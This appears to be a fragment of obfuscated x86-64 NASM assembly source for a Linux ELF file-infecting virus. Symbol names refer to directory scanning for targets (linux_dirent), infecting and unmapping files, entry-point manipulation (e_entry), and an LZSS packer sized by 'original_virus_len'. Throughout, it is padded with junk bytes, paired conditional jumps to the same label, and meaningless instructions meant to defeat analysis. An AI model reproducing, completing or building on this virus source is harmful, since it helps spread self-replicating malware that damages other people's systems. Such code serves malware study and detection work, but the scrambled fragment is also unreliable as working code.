    jmp         $+5
db 0x5d, 0xae, 0x24
    js          ..@Uy8hBCcFceSb
    jns         ..@Uy8hBCcFceSb
..@NOTozCvc8HGp:
    add         r5, 1
    jmp         $+4
db 0xe7, 0x47
    jl          ..@ySBf5oACJAC0
    jge         ..@ySBf5oACJAC0
..@hMW3KbBaIi9y:
    pop         rcx
    jmp         ..@wLHkTYOAuuCE
..@gcfJK5FRFMaV:
    push        r1
    mov         r5, r2
    mov         r2, QWORD [r1+file.filename]
    jmp         $+4
db 0x26, 0x8b
    jmp         ..@EcqvuvkANxA6
..@5dpvQuyiI1Zw:
    mov         BYTE [rdi], 90h
    jb          ..@U8EnATw385EA
    jae         ..@U8EnATw385EA
..@LH7aFX8SHc5D:
    jmp         ..@eRAluMOT1Lfs
    jmp         $+4
db 0xf5, 0x08
    js          ..@uPqwT1WuMIIc
    jns         ..@uPqwT1WuMIIc
..@YBoCC4R5qQmI:
%ifndef ENABLE_DEBUGGING
    cmp         r2b, 0x0
    jge         ..@vm1gTbXHFdbw
%endif
    jl          ..@2JZHv8BVS9fe
    jge         ..@2JZHv8BVS9fe
..@V0hNBUUpMlI3:
%ifdef X86_64
    shr         rdx, 16
%endif
    jmp         ..@IkRDK4St7jSq
..@8bNUR6tzsLYu:
%ifdef X86_64
    sete        al
    je          ..@ch0S0WKV53LI
%endif
    jmp         $+3
db 0xa9
    jb          ..@XZipEG8hhrIo
    jae         ..@XZipEG8hhrIo
..@94Quf9SwLYLk:
    mov         rbp, rbp
    jmp         ..@WayzuRbI07iz
..@NE2njpPLUvhI:
    jmp         ..@2t4YZuFFVd08
    jmp         $+4
db 0x59, 0x02
    jl          ..@bkgJAymg82JB
    jge         ..@bkgJAymg82JB
..@cgI2BO16mWpi:
    rep         movsb
    jmp         ..@vkcU7a2j6WRF
..@R7TqSd7NACL6:
    add         rcx, 2*bytes
    jmp         $+3
db 0xa9
    jmp         ..@z2XvYKonL7kK
..@HLsKnX55ZEpX:
%ifdef X86_64
    jmp         ..@61vccviur7cD
%endif
    js          ..@2t4YZuFFVd08
    jns         ..@2t4YZuFFVd08
..@WkxFEhI1Kazg:
    je          ..@Y6wPGi54f1Hm
    cmp         dl, 2dh
    jmp         ..@qHRcbybFHoB4
..@8zSaA7RMW3Rb:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    jmp         $+5
db 0xe7, 0x39, 0x9f
    jmp         ..@G330U5Ia3k8D
..@E9eb3sGnhDkZ:
    or          edi, eax
    jmp         $+3
db 0x1b
    jmp         $+5
db 0xeb, 0x95, 0x44
    jmp         $+3
db 0x31
    js          ..@DYhtjgyU1vOi
    jns         ..@DYhtjgyU1vOi
LzssEncoder:
    jmp         ..@lvjtM5e6W9vy
..@GUS2W0jvGXzF:
    je          ..@LCVrLHKyODmi
    rep         nop
    jb          ..@AoqCNPv5cZSl
    jae         ..@AoqCNPv5cZSl
..@SxWkm23Z9si6:
    mov         QWORD [rdi], rsi
    xor         rcx, rcx
    mov         rdi, m6
    jmp         $+5
db 0xeb, 0x92, 0x89
    jmp         $+4
db 0x49, 0x2f
    jl          ..@ERoUqbZ9Csak
    jge         ..@ERoUqbZ9Csak
..@STld9wsjq5VZ:
%ifdef X86_64
    cmp         edx, 0000b841h
%endif
    jl          ..@8bNUR6tzsLYu
    jge         ..@8bNUR6tzsLYu
..@CwhflTQISPR1:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    push        rsi
    pop         rsi
%endif
    jb          ..@97IL1VvCmaCF
    jae         ..@97IL1VvCmaCF
..@Vk8ullgq1VSQ:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    push        rbx
    jl          ..@I17qbJR5z4zp
    jge         ..@I17qbJR5z4zp
..@u8yTMPgjHmRg:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+3
db 0xc8
    jmp         $+5
db 0xc5, 0x5b, 0x79
    jl          ..@EsaDFR85rJrQ
    jge         ..@EsaDFR85rJrQ
..@RATTV1n6h58s:
    mov         rax, rax
    jmp         ..@51KBXkPwssNO
..@Dk1f4xc6gGi8:
    pop         rbx
    xor         rcx, rcx
    jmp         $+4
db 0x31, 0x65
    jmp         ..@Ybo8PavefWgm
..@VG5xE2EEeDBy:
    sub         r4, QWORD [r1+e_h.e_entry]
    cmp         r4, 0x00
    jle         ..@IqyIJNVLcwnu
    push        r1
    push        r2
    jmp         ..@6jfDsQEmTGbw
..@ITL5IGVOOseQ:
    mov         r3, r1
    sub         r3, PADDING
    mov         r2, original_virus_len-non_packed_len
    jb          ..@tLdFaQtEm4WX
    jae         ..@tLdFaQtEm4WX
..@tPjNQxEUuXLQ:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jl          ..@FG4g8wb1JIOk
    jge         ..@FG4g8wb1JIOk
..@pgIhDN3P7VAV:
    jz          ..@1ta7OlaN9Eor
    jmp         $+5
db 0x8b, 0x69, 0x07
    jl          ..@1QgRipgWtEUb
    jge         ..@1QgRipgWtEUb
..@JA49Horbx4qu:
    and         ecx, 0ffffff80h
    jl          ..@OnPszk2KSbjX
    jge         ..@OnPszk2KSbjX
..@rvQ5Qvoq5CUB:
    push        rcx
    mov         rdi, rsi
    add         rdi, rcx
    mov         rsi, rsi
    jl          ..@1Gpx8ZDFXsqK
    jge         ..@1Gpx8ZDFXsqK
..@KH9gXogLHpb8:
    push        rdx
    pop         rdx
    xor         rcx, rcx
    js          ..@9eyaY3RsIZWn
    jns         ..@9eyaY3RsIZWn
..@VDEcVZ8bEGdD:
    xor         rax, rax
    xor         rdi, rdi
    jl          ..@nh7BLVYm4wiB
    jge         ..@nh7BLVYm4wiB
..@JsytMmvyRtQS:
    xor         rdx, rdx
    jmp         ..@PlxTmGl3ii11
..@wt7LQzCE2Ont:
    xor         rax, rax
    js          ..@NaRzZVaTOhmm
    jns         ..@NaRzZVaTOhmm
..@5969UREY6DIV:
%ifdef X86_64
    je          ..@gdxWmThcBjhG
    mov         rcx, rcx
%endif
    jmp         $+4
db 0xda, 0x7b
    jmp         $+5
db 0xee, 0xb1, 0x7e
    je          ..@33WfkG6lpTO2
    jne         ..@33WfkG6lpTO2
..@ckbyFAVsOnxi:
    push        rbx
    jmp         $+5
db 0x6b, 0xcb, 0x86
    jmp         $+5
db 0x31, 0xc9, 0x9c
    js          ..@h8I50ANlWgmM
    jns         ..@h8I50ANlWgmM

_eof:
